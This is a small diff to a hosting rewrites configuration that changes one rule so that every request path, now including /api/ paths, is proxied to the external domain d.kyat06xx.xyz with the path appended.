@@ -1,8 +1,8 @@
 {
   "rewrites": [
     {
-      "source": "/((?!api/).*)",
-      "destination": "http://d.kyat06xx.xyz"
+      "source": "/(.*)",
+      "destination": "http://d.kyat06xx.xyz/$1"
     }
   ]
 }
